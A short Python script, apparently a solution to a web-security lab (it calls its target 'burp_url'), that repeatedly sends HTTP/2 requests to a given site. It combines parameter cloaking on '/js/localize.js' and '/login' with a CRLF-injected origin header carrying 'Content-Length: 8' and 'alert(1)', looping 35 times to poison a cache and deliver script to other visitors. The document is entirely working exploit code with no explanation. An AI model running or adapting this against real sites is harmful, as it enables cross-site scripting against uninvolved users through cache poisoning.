import sys
import httpx

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    request1 = burp_url + '/js/localize.js?lang=en?utm_content=z&cors=1&x=1'
    request2 = burp_url + '/login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23'

    burp_headers = {"origin": "x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$"}

    # Użyj httpx z HTTP/2
    with httpx.Client(http2=True) as client:
        for i in range(35):
            response1 = client.get(request1, headers=burp_headers)
            response2 = client.get(request2)
            
